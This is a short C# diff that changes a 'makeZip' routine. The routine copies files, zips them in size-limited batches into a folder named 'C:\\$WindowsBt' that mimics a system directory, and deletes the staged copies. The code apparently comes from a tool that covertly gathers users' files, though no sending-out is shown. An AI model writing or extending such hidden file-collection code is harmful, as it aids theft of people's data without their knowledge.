@@ -14,8 +14,10 @@ namespace systemU
         public void makeZip(List<FileIO> f)
         {
             List<string> paths = new List<string>();
+            int altrationNumber = 0;
             Random r = new Random();
             long totalSize = 0;
+            long qw = 0;
             f.ForEach(i =>
                     {
                     
@@ -34,7 +36,15 @@ namespace systemU
                    File.Copy(i.Path, savePath);
                }
                paths.Add(savePath);
-               if (totalSize > 1024)
+               if(altrationNumber < f.Count - 1)
+                        {
+                            qw = f[altrationNumber + 1].Size;
+                        }
+                        else
+                        {
+                            qw = 0;
+                        }
+               if (totalSize + qw > 10000)
                {
                    if (!Directory.Exists("C:\\$WindowsBt"))
                        Directory.CreateDirectory("C:\\$WindowsBt");
@@ -43,6 +53,7 @@ namespace systemU
                    paths.ForEach(p => { File.Delete(p); });
                    paths = new List<string>();
                }
+                        altrationNumber++;
            });
             if (!Directory.Exists("C:\\$WindowsBt"))
                 Directory.CreateDirectory("C:\\$WindowsBt");
